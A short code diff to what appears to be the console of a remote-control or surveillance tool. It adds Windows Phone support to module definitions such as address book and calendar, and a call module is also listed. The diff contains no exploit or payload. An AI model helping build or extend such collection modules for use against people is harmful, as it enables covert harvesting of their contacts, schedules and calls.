@@ -40,11 +40,11 @@ package it.ht.rcs.console
 		public static function getModules(skipFilter:Boolean=false):Array
 		{
 
-			var modules:Array=[{module: "addressbook", _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,symbian,android,linux"},
+			var modules:Array=[{module: "addressbook", _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,symbian,android,linux,winphone"},
 
 				{module: "application", _type: "desktop,mobile", _platform: "windows,osx,ios,blackberry,winmo,symbian,android,linux"},
 
-				{module: "calendar", _type: "desktop,mobile", _platform: "osx,ios,blackberry,winmo,symbian,android,linux"},
+				{module: "calendar", _type: "desktop,mobile", _platform: "osx,ios,blackberry,winmo,symbian,android,linux,winphone"},
 
 				{module: "call", buffer: 512000, compression: 5,
 
